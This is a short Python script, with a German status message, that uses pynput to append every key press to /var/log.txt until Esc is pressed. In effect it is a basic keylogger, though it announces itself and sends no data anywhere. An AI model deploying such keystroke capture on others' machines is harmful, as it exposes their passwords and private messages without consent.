from pynput.keyboard import Key, Listener

def on_press(key):
    with open("/var/log.txt", "a") as f:
        f.write(f"{key}\n")

def on_release(key):
    if key == Key.esc:
        return False

print("Listener startet...")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()